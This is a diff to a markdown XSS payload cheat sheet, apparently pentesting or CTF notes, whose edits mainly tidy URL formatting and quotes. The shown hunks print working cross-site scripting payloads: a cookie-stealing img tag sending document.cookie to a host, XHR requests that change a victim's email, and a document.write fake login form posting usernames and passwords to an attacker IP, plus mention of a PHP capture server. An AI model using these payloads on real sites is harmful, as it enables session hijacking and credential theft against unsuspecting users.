@@ -129,18 +129,18 @@ Additionally, there's nothing to indicate that the `ctfio.com` is the end of the
 
 ```jsx
 let xhr = new XMLHttpRequest()
-xhr.open('GET','<http://localhost/endpoint>',true)
+xhr.open('GET','http://localhost/endpoint',true)
 xhr.send('email=update@email.com’)
 ```
 
 ```jsx
-fetch('<http://localhost/endpoint’>)
+fetch("http://localhost/endpoint");
 ```
 
 ### Stealing Cookies
 
 ```jsx
-<img src="<http://localhost?c='+document.cookie+'>" />
+<img src="http://localhost?c='+document.cookie+'" />
 ```
 
 ```jsx
@@ -186,7 +186,7 @@ setTimeout(function () {
 
 ```jsx
 let xhr = new XMLHttpRequest();
-xhr.open('POST','<http://localhost/updateprofile>',true);
+xhr.open('POST','http://localhost/updateprofile',true);
 xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 xhr.send('email=updated@email.com’);
 ```
@@ -208,7 +208,7 @@ document.onkeypress = function (e) {
 document.write('<h3>Please login to continue</h3><form action=http://10.10.14.4:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
 ```
 
-Use with a fake server script 
+Use with a fake server script
 
 ```php
 <?php
@@ -302,4 +302,3 @@ if (isset($_GET['c'])) {
 - [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 - [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
 - [payload-box](https://github.com/payload-box/xss-payload-list)
-- 
